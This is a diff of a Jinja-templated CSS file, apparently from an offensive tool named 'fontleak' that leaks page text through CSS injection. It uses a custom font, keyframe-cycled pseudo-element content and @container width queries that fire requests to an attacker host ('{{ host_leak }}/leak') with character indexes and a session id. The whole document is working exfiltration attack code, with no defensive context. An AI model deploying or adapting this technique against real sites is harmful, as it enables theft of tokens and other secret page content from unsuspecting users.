@@ -53,17 +53,9 @@ body {
     position: static !important;
 }
 
-{% for i in range(idx_max) %}
-    @font-face {
-        font-family: 'fontleak{{ i }}';
-        src: url('{{ host }}/?step={{ i }}&id={{ id }}') format('opentype');
-        font-display: swap;
-    }
-{% endfor %}
-
 @font-face {
     font-family: 'fontleak';
-    src: url('{{ host }}/font.ttf') format('opentype');
+    src: url('{{ font_path }}') format('opentype');
 }
 
 /* Target element styling */
@@ -84,13 +76,22 @@ body {
     background: skyblue !important;
     will-change: content, transform !important;
     position: relative !important;
-    animation: fontCycle {{ idx_max }}s steps(1) infinite 1s;
+}
+
+{{ leak_selector }}::before {
+    margin: 0 !important;
+    padding: 0 !important;
+    font-family: 'fontleak' !important;
+    font-size: 1000px !important;
+    white-space: pre-line !important;
+    content: "{{ step_char }}";
+    animation: fontCycle {{ idx_max * 0.05 }}s steps(1) infinite 1s;
 }
 
 @keyframes fontCycle {
     {% for i in range(idx_max) %}
     {{ (i / idx_max) * 100 }}% {
-        font-family: 'fontleak{{ i }}', 'fontleak';
+        content: "{{ step_chars[i] }}";
     }
     {% endfor %}
 }
@@ -98,7 +99,7 @@ body {
 {% for container in width_containers %}
 @container leak (width: {{ container.width }}px) {
     head::before {
-        content: url("{{ host_leak }}/leak?step={{ container.step }}&idx={{ container.char_idx }}&id={{ id }}");
+        content: var(--a, var(--b, url("{{ host_leak }}/leak?idx={{ container.char_idx }}&sid={{ id }}")));
     }
 }
 {% endfor %}
